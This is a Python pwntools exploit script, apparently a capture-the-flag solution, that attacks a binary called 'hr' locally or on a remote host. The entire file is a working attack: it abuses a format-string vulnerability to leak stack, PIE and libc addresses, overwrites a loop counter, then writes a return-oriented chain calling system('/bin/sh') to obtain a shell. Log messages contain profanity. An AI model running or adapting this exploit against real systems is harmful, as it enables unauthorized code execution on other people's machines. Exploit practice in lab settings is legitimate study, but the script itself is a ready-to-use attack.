from pwn import *
import sys
import time

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./hr"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+195
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

# def exploit():
#     log.info("binary loaded")
#     pp.recvuntil(b"!")
#     pp.sendline(b"%p %100$pzz")
#     leaks = str(pp.recvuntil(b"zz")[1:-2]).replace("b'", "").replace("'", "").split(" ")
#     i_stack = int(leaks[0], 16) - 4
#     log.info("overwriting the i variable")
#     ivar = fmtstr_payload(8, {i_stack: -1000})
#     pp.sendline(ivar)
#     for i in range(130):
#         pp.sendline(f"%p %{i}$p".encode())
#         print(f"{pp.recv()} {i}")
    

def exploit():
    # offset = 
    log.info("binary loaded")
    pp.recvuntil(b"!")
    if (args.REMOTE):
        pp.sendline(f"%p %100$pzz".encode())
    elif (args.GDB):
        pp.sendline(f"%p %147$pzz".encode())
    else:
        pp.sendline(f"%p %148$pzz".encode())
    pleaks = str(pp.recvuntil(b"zz")[1:-2]).replace("b'", "").replace("'", "").split(" ")
    print(pleaks)
    i_stack = int(pleaks[0], 16) - 4
    log.info("overwriting the i variable")
    ivar = fmtstr_payload(8, {i_stack: -3})
    pp.sendline(ivar)
    log.success("you can now write how many you want on the fucking stack")
    rip_addr = int(pleaks[0], 16) + 280
    elf.address = int(pleaks[1], 16) - 4320
    log.warn(f"fucking stack leak {hex(rip_addr)}")
    log.warn(f"fucking pie {hex(elf.address)}")
    log.info("leaking libc aslr")
    pop_rdi = 0x0000000000001323
    pp.recvline()
    payloads = [
            fmtstr_payload(8, {rip_addr: (elf.address + pop_rdi)}),
            fmtstr_payload(8, {rip_addr + 8: elf.got.printf}),
            fmtstr_payload(8, {rip_addr + 16: elf.plt.puts}),
            fmtstr_payload(8, {rip_addr + 24: elf.sym._start}),
            ]
    for i in payloads :
        pp.sendline(i)
        pp.recvuntil(b"\x7f")
    if (not args.REMOTE):
        pp.recvuntil(b"/bin/sh")
    else:
        pp.recvuntil(b"/bin/sh")
    leak = pp.recvline().rstrip()
    pp.recv()
    leak += b"\x00" * (8 - len(leak))
    libc.address = u64(leak) - libc.sym.printf
    log.success(f"LIBC base is leaked {hex(libc.address)}")
    log.info("leaking stack infos again")
    pp.sendline(b"%p zz")
    leaks = pp.recvuntil(b"zz").replace(b" zz", b"").decode()
    i_stack = int(leaks, 16) - 4
    log.info("overwriting the i variable")
    ivar = fmtstr_payload(8, {i_stack: -3})
    pp.sendline(ivar)
    rip_addr = int(leaks, 16) + (35 * 8)
    log.info(f"another stack_leak leaks {leaks} rip {hex(rip_addr)}")
    pp.recv()
    ret = 0x000000000000101a
    print(f"system {hex(libc.sym.system)}")
    payloads = [
            fmtstr_payload(8, {rip_addr : (elf.address + pop_rdi)}),
            fmtstr_payload(8, {rip_addr + 8: elf.address + 0x2045}),
            fmtstr_payload(8, {rip_addr + 16: (elf.address + ret)}),
            fmtstr_payload(8, {rip_addr + 24 : libc.sym.system}),
            ]
    for i in payloads :
        log.warn(f"sending the payloads {len(i)}")
        pp.sendline(i)
        pp.recv()
    # pp.recv()
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc-2.31.so")
    log.warn("using fucking server glibc just as you knwo")
else :
    log.warn("using the system libc for fuck sake")
    libc = ELF("/usr/lib/libc.so.6")
elf = context.binary = ELF(binary)
pp = init()
exploit()

# 0x7fffffffdd10 0xff 0x7ffff7ec4531 0x555555555330 0x7ffff7fcecd0 0x7fffffffdde
